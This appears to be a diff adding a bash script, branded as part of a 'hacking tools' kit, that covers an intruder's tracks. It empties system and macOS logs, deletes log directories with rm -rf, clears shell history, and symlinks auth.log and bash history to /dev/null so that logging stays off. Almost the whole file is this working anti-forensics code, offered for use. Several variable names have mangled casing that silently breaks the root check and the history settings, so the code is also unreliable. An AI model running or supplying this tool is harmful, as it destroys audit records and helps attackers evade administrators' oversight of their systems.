@@ -1,0 +1,223 @@
+#!/usr/bin/env bash
+
+me="\033[31;1m"
+hi="\033[32;1m"
+ku="\033[33;1m"
+bi="\033[34;1m"
+un="\033[35;1m"
+cy="\033[36;1m"
+pu="\033[37;1m"
+
+x="z"
+while [ $x = "z" ]
+do
+
+bul=$(date +"%B")
+tan=$(date +"%d")
+tim=$(date +"%t")
+yer=$(date +"%Y")
+waktu=$(printf "$me$bul $me$tan $pu$tim $me$yer")
+
+baner(){
+printf $hi"""
+┌┬┐┌─┐┌─┐┬┌─┬┌┬┐ $pu Author  :$me K1M4K-Id
+│││└─┐├┤ ├┴┐│ │  $pu Support :$me KIMAK
+┴ ┴└─┘└  ┴ ┴┴ ┴  $pu date    : $waktu
+ _______________________________________________________________
+|                                                               |
+|     MSF-KIt => hacking tools, exploit, phising, Spoofing      |
+|_______________________________________________________________|
+|                                                               |
+|                                                               |
+|                                                               |
+|                                                               |
+|_______________________________________________________________|
+"""
+}
+
+
+
+
+LoGS_FILeS=(
+        /var/log/messages # General message and system related stuff
+        /var/log/auth.log # Authenication logs
+        /var/log/kern.log # Kernel logs
+        /var/log/cron.log # Crond logs
+        /var/log/maillog # Mail server logs
+        /var/log/boot.log # System boot log
+        /var/log/mysqld.log # MySQL database server log file
+        /var/log/qmail # Qmail log directory
+        /var/log/httpd # Apache access and error logs directory
+        /var/log/lighttpd # Lighttpd access and error logs directory
+        /var/log/secure # Authentication log
+        /var/log/utmp # Login records file
+        /var/log/wtmp # Login records file
+        /var/log/yum.log # Yum command log file
+        /var/log/system.log # System Log
+        /var/log/diagnosticMessages # Mac Analytics data
+        /Library/Logs # System Application Logs
+        /Library/Logs/diagnosticreports # System reports
+        ~/Library/Logs # User Application Logs
+        ~/Library/Logs/diagnosticreports # User reports
+)
+
+function isroot () {
+        if [ "$eUId" -ne 0 ]; then
+                return 1
+        fi
+}
+
+function menu () {
+	clear
+	baner
+        echo
+        printf $hi"[$me 1$hi ]$pu clear logs for user $USer\n"
+        printf $hi"[$me 2$hi ]$pu permenently disable auth & bash history\n"
+        printf $hi"[$me 3$hi ]$pu restore settings to default\n"
+        printf $hi"[$me 0$hi ]$pu exit tool\n"
+        echo
+
+        read -p "$(printf $me"[$hi *$me ] choice : "$pu)" option
+        echo
+}
+
+function disableAuth () {
+        if [ -w /var/log/auth.log ]; then
+                ln /dev/null /var/log/auth.log -sf
+                printf $hi"[$me *$hi ]$pu permanently sending /var/log/auth.log to /dev/null\n"
+        else
+                printf $hi"[$me !$hi ]$pu /var/log/auth.log is not writable! retry using sudo.\n"
+        fi
+}
+
+function disablehistory () {
+        ln /dev/null ~/.bash_history -sf
+        printf $hi"[$me *$hi ]$pu permanently sending bash_history to /dev/null\n"
+
+        if [ -f ~/.zsh_history ]; then
+                ln /dev/null ~/.zsh_history -sf
+                printf $hi"[$me *$hi ]$pu permanently sending zsh_history to /dev/null\n"
+        fi
+
+        export hIStFILeSIZe=0
+        export hIStSIZe=0
+        printf $hi"[$me *$hi ]$pu Set hIStFILeSIZe & hIStSIZe to 0\n"
+
+        set +o history
+        printf $hi"[$me *$hi ]$pu disabled history library\n"
+
+        
+        printf $hi"[$me *$hi ]$pu permenently disabled bash log.\n"
+}
+
+function enableAuth () {
+        if [ -w /var/log/auth.log ] && [ -L /var/log/auth.log ]; then
+                rm -rf /var/log/auth.log
+                printf "" > /var/log/auth.log
+                printf $hi"[$me *$hi ]$pu disabled sending auth logs to /dev/null\n"
+        else
+                printf $hi"[$me !$hi ]$pu /var/log/auth.log is not writable! retry using sudo.\n"
+        fi
+}
+
+function enablehistory () {
+        if [[ -L ~/.bash_history ]]; then
+                rm -rf ~/.bash_history
+                printf "" > ~/.bash_history
+                printf $hi"[$me *$hi ]$pu disabled sending history to /dev/null\n"
+        fi
+
+        if [[ -L ~/.zsh_history ]]; then
+                rm -rf ~/.zsh_history
+                printf "" > ~/.zsh_history
+                printf $hi"[$me *$hi ]$pu disabled sending zsh history to /dev/null\n"
+        fi
+
+        export hIStFILeSIZe=""
+        export hIStSIZe=50000
+        printf $hi"[$me *$hi ]$pu restore hIStFILeSIZe & hIStSIZe default values.\n"
+
+        set -o history
+        printf $hi"[$me *$hi ]$pu enabled history library\n"
+
+        printf $hi"[$me *$hi ]$pu permenently enabled bash log.\n"
+}
+
+function clearLogs () {
+        for i in "${LoGS_FILeS[@]}"
+        do
+                if [ -f "$i" ]; then
+                        if [ -w "$i" ]; then
+                                printf "" > "$i"
+                                printf $hi"[$me *$hi ]$pu $i cleaned.\n"
+                        else
+                                printf $hi"[$me !$hi ]$pu $i is not writable! retry using sudo.\n"
+                        fi
+                elif [ -d "$i" ]; then
+                        if [ -w "$i" ]; then
+                                rm -rf "${i:?}"/*
+                                printf $hi"[$me *$hi ]$pu $i cleaned.\n"
+                        else
+                                printf $hi"[$me !$hi ]$pu $i is not writable! retry using sudo.\n"
+                        fi
+                fi
+        done
+}
+
+function clearhistory () {
+        if [ -f ~/.zsh_history ]; then
+                printf "" > ~/.zsh_history
+                printf $hi"[$me *$hi ]$pu ~/.zsh_history cleaned.\n"
+        fi
+
+        printf "" > ~/.bash_history
+        printf $hi"[$me *$hi ]$pu ~/.bash_history cleaned.\n"
+
+        history -c
+        printf $hi"[$me *$hi ]$pu history file deleted.\n"
+
+        printf $hi"[$me *$hi ]$pu reminder: your need to reload the session to see effects.\n"
+        printf $hi"[$me *$hi ]$pu type exit to do so.\n"
+}
+
+function exittool () {
+        exit 1
+}
+
+clear # Clear output
+
+# "now" option
+if [ -n "$1" ] && [ "$1" == 'now' ]; then
+        clearLogs
+        clearhistory
+        exit 0
+fi
+
+menu
+
+if [[ $option == 1 ]]; then
+        # Clear logs & current history
+        clearLogs
+        clearhistory
+        printf $hi"[$me *$hi ]$pu\n"
+        read -p "$(printf $me"[$hi *$me ] back"$pu)" option
+elif [[ $option == 2 ]]; then
+        # permenently disable auth & bash log
+        disableAuth
+        disablehistory
+        printf $hi"[$me *$hi ]$pu\n"
+        read -p "$(printf $me"[$hi *$me ] back"$pu)" option
+elif [[ $option == 3 ]]; then
+        # restore default settings
+        enableAuth
+        printf $hi"[$me *$hi ]$pu\n"
+        enablehistory
+        read -p "$(printf $me"[$hi *$me ] back"$pu)" option
+elif [[ $option == 0 ]]; then
+        # exit tool
+        exittool
+else
+        printf $hi"[$me !$hi ]$pu option not reconized. exiting.\n"
+        menu
+fi
+done
